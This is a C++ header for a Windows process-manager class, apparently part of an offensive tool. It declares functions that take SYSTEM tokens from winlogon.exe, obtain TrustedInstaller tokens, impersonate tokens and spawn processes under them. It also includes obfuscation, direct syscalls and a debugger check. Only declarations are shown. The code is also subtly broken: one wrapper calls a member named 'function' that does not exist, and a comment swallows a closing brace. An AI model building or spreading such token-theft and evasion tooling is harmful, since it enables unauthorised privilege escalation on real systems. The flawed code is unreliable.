#pragma once

#include "natives.h"
#include "syscalls.h"
#include "External/obfuscate.h"

#include <any>

extern "C" PVOID GetPebAddress(); // Get the address of the current processes PEB.

// dynamically loaded dlls
static HMODULE Kernel32DLL;
static HMODULE NTDLL;
static HMODULE AdvApi32DLL;

static BOOL    DllsLoaded = FALSE;

template <typename fp>
struct FunctionPointer {
	fp			call;
	std::string name;
	HMODULE     from;

	FunctionPointer() = default;
};

class ProcessManager {
public:
	ProcessManager();
	~ProcessManager();

	HMODULE            GetLoadedLib(std::string libName); // Return a handle of an already loaded dll from 'loadedDlls'
	BOOL               FreeUsedLibrary(std::string lib); // Free a loaded library 'lib'

	DWORD              PIDFromName(const char* name); // Get the process ID from a process name.
	HANDLE			   ImpersonateWithToken(HANDLE token);
	HANDLE             CreateProcessAccessToken(DWORD processID); // Duplicate a process security token from the process id
	DWORD              StartWindowsService(std::string serviceName); // Start a Windows service 'serviceName'—return process id.
	HANDLE             GetSystemToken(); // Get a SYSTEM permissions security token from winlogon.exe.
	HANDLE			   GetTrustedInstallerToken(); // Obtain a Trusted Installer security token.
	BOOL               CheckNoDebugger(); // Check if the current process is being debugged.

	// Wrapper that uses function pointer for CreateProcessWithTokenW
	BOOL OpenProcessAsImposter(
		HANDLE			      token,
		DWORD			      dwLogonFlags,
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
	);

	template <typename fp>
	inline const FunctionPointer<fp> GetNative(char* name) {
		if ( !this->Natives.contains(name) )
			return {};

		return std::any_cast< FunctionPointer<fp> >( this->Natives.at(name) );
	}

	// Get the address of a function and cast it to a function pointer type.
	template <typename fpType>
	static inline fpType GetFunctionAddress(HMODULE lib, std::string proc) {
		return reinterpret_cast< fpType >( GetFunctionAddressInternal(lib, proc) );
	}

	// call a function dynamically
	template <typename fpType, typename ...Args>
	static inline auto Call(HMODULE lib, std::string name, Args&&... args) noexcept {
		return GetFunctionAddress<fpType>(lib, name)( std::forward<Args>(args)... );
	}

	template <typename fp, typename ...Args>
	inline auto Call(FunctionPointer<fp>& function, Args&&... args) noexcept {
		return function.function(args...);
	}

private:
	std::unordered_map<std::string, HMODULE>  LoadedDLLs;
	std::unordered_map<std::string, std::any> Natives; // native function pointers

	BOOL NativesLoaded = FALSE;

	template <typename type>
	void			   LoadNative(char* name, HMODULE from);
	void			   LoadAllNatives();
	static FARPROC     GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
	HMODULE            GetLoadedModule(std::string libName); // Get the handle of a dll 'libname'};
};